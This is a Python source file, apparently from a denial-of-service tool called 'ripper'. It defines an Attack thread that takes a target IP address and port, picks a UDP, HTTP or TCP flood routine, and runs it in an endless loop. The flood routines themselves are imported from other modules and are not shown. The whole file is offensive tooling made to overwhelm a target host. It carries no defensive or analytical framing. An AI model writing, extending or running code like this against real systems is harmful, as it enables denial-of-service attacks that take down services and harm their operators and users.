from threading import Thread
from typing import Tuple, Any

from ripper.actions.http_flood import HttpFlood
from ripper.actions.tcp_flood import TcpFlood
from ripper.actions.udp_flood import UdpFlood
from ripper.context import Context
from ripper.actions.attack_method import AttackMethod

class Attack(Thread):
    """This class creates threads with specified attack method."""
    _target: Tuple[str, int]
    """Target IPv4 address and destination port."""
    _method: str
    """Attack method."""
    _ctx: Context
    """Context to collect Statistic."""
    attack_method: AttackMethod

    def __init__(self, target: Tuple[str, int], method: str = 'tcp', context: Context = None):
        """
        :param target: Target IPv4 address and destination port.
        :param method: Attack method.
        """
        Thread.__init__(self, daemon=True)
        self._target = target
        self._method = method
        self._ctx = context

    def run(self):
        self.create_attack(self._method)
        while True:
            self.attack_method()

    def create_attack(self, method: str):
        """Create attack for specified method."""
        if method == 'udp':
            self.attack_method = UdpFlood(self._target, self._ctx)
        elif method == 'http':
            self.attack_method = HttpFlood(self._target, self._ctx)
        else:  # TCP by default
            self.attack_method = TcpFlood(self._target, self._ctx)
